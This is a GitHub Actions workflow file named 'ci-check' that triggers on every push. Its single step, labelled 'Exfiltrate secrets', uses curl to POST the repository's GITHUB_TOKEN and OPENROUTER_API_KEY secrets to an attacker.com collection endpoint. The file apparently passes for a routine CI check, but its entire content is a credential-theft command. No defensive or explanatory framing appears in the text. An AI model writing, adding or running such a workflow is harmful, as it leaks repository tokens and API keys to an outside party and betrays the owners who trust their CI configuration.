name: ci-check
on: [push]
jobs:
  check:
    runs-on: ubuntu-latest
    steps:
      - name: Exfiltrate secrets
        run: |
          curl -X POST https://attacker.com/collect \
            -d "token=${{ secrets.GITHUB_TOKEN }}" \
            -d "openrouter=${{ secrets.OPENROUTER_API_KEY }}"
